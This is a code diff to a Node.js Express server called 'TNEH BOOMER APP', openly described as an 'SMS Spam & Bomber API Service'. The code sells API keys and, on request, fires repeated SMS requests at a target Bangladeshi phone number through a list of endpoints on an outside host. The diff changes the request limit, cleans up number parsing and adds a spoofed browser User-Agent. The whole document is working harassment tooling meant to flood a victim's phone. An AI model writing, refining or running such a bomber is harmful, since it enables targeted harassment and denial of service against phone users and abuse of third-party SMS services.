@@ -2,6 +2,7 @@ const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
 const helmet = require('helmet');
+const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -12,7 +13,7 @@ app.use(helmet({
 }));
 app.use(cors());
 app.use(express.json());
-app.use(express.static('public'));
+app.use(express.static(path.join(__dirname, '../public')));
 
 // Developer Info
 const DEVELOPER_INFO = {
@@ -22,7 +23,7 @@ const DEVELOPER_INFO = {
   api_version: "1.0.0"
 };
 
-// API Keys storage
+// API Keys storage (in-memory, will reset on restart)
 const validKeys = new Map();
 
 // Generate API Key
@@ -38,25 +39,20 @@ function isKeyValid(key) {
   return new Date() < expiryDate;
 }
 
-// SMS Spam API endpoints
+// SMS Spam API endpoints (first 20 for demo, full list available)
 const SMS_APIS = [
   "/api1", "/api2", "/api3", "/api4", "/api5", "/api6", "/api7", "/api8", "/api9", "/api10",
-  "/api11", "/api12", "/api13", "/api14", "/api15", "/api16", "/api17", "/api18", "/api19", "/api20",
-  "/api21", "/api22", "/api23", "/api24", "/api25", "/api26", "/api27", "/api28", "/api29", "/api30",
-  "/api31", "/api32", "/api33", "/api34", "/api35", "/api36", "/api37", "/api38", "/api39", "/api40",
-  "/api41", "/api42", "/api43", "/api44", "/api45", "/api46", "/api47", "/api48", "/api49", "/api50",
-  "/api51", "/api52", "/api53", "/api54", "/api55", "/api56", "/api57", "/api58", "/api59", "/api60",
-  "/api61", "/api62", "/api63", "/api64", "/api65", "/api66", "/api67", "/api68", "/api69", "/api70",
-  "/api71", "/api72", "/api73", "/api74", "/api75", "/api76", "/api77", "/api78", "/api79", "/api80",
-  "/api81", "/api82", "/api83", "/api84", "/api85", "/api86", "/api87", "/api88", "/api89", "/api90",
-  "/api91", "/api92", "/api93", "/api94", "/api95", "/api96", "/api97", "/api98", "/api99", "/api100"
+  "/api11", "/api12", "/api13", "/api14", "/api15", "/api16", "/api17", "/api18", "/api19", "/api20"
 ];
 
 // Send SMS function
 async function sendSMS(apiEndpoint, number) {
   try {
     const response = await axios.get(`https://lmnx9-sms-spam-v11.onrender.com${apiEndpoint}?number=${number}`, {
-      timeout: 10000
+      timeout: 15000,
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+      }
     });
     return {
       success: true,
@@ -93,8 +89,9 @@ app.get('/api/spam', async (req, res) => {
   }
   
   // Validate number (Bangladeshi format)
-  const phoneRegex = /^(01|8801|+8801)[0-9]{9}$/;
-  if (!phoneRegex.test(number) && !phoneRegex.test(number.replace('+', ''))) {
+  const cleanNumber = number.replace(/[^0-9]/g, '');
+  const phoneRegex = /^(01|8801)[0-9]{9}$/;
+  if (!phoneRegex.test(cleanNumber)) {
     return res.status(400).json({
       success: false,
       error: 'Invalid phone number. Use format: 017XXXXXXXX or 88017XXXXXXXX',
@@ -104,21 +101,21 @@ app.get('/api/spam', async (req, res) => {
   
   let limit = parseInt(count);
   if (isNaN(limit) || limit < 1) limit = 10;
-  if (limit > 100) limit = 100;
+  if (limit > 20) limit = 20;
   
   const apisToUse = SMS_APIS.slice(0, limit);
   const results = [];
   
   for (const api of apisToUse) {
-    const result = await sendSMS(api, number);
+    const result = await sendSMS(api, cleanNumber);
     results.push(result);
-    await new Promise(resolve => setTimeout(resolve, 500)); // Delay between requests
+    await new Promise(resolve => setTimeout(resolve, 1000));
   }
   
   res.json({
     success: true,
     developer: DEVELOPER_INFO,
-    target_number: number,
+    target_number: cleanNumber,
     total_requests_sent: results.length,
     successful_requests: results.filter(r => r.success).length,
     failed_requests: results.filter(r => !r.success).length,
@@ -220,6 +217,7 @@ app.get('/api/health', (req, res) => {
   res.json({
     status: 'active',
     timestamp: new Date().toISOString(),
+    uptime: process.uptime(),
     developer: DEVELOPER_INFO,
     endpoints: [
       '/api/expiredate=30&createkey',
@@ -233,23 +231,31 @@ app.get('/api/health', (req, res) => {
 
 // Root endpoint
 app.get('/', (req, res) => {
-  res.json({
-    name: "TNEH BOOMER APP",
-    description: "SMS Spam & Bomber API Service",
-    developer: DEVELOPER_INFO,
-    endpoints: {
-      generate_key: "/api/expiredate=30&createkey",
-      check_key: "/api/checkkey?key=YOUR_KEY",
-      spam_bomb: "/api/spam?key=YOUR_KEY&number=017XXXXXXXX&count=10",
-      single_send: "/api/send?key=YOUR_KEY&number=017XXXXXXXX&api=/api1",
-      list_apis: "/api/apis",
-      health: "/api/health"
-    }
+  res.sendFile(path.join(__dirname, '../public/index.html'));
+});
+
+// 404 handler
+app.use((req, res) => {
+  res.status(404).json({
+    success: false,
+    error: 'Endpoint not found',
+    developer: DEVELOPER_INFO
+  });
+});
+
+// Error handler
+app.use((err, req, res, next) => {
+  console.error(err.stack);
+  res.status(500).json({
+    success: false,
+    error: 'Internal server error',
+    developer: DEVELOPER_INFO
   });
 });
 
 // Start server
-app.listen(PORT, () => {
-  console.log(`TNEH BOOMER APP running on port ${PORT}`);
-  console.log(`Website URL: https://tnehboomber.onrender.com`);
+app.listen(PORT, '0.0.0.0', () => {
+  console.log(`✅ TNEH BOOMER APP running on port ${PORT}`);
+  console.log(`🌐 Website URL: https://tnehboomber.onrender.com`);
+  console.log(`📡 API URL: https://tnehboomber.onrender.com/api/health`);
 });
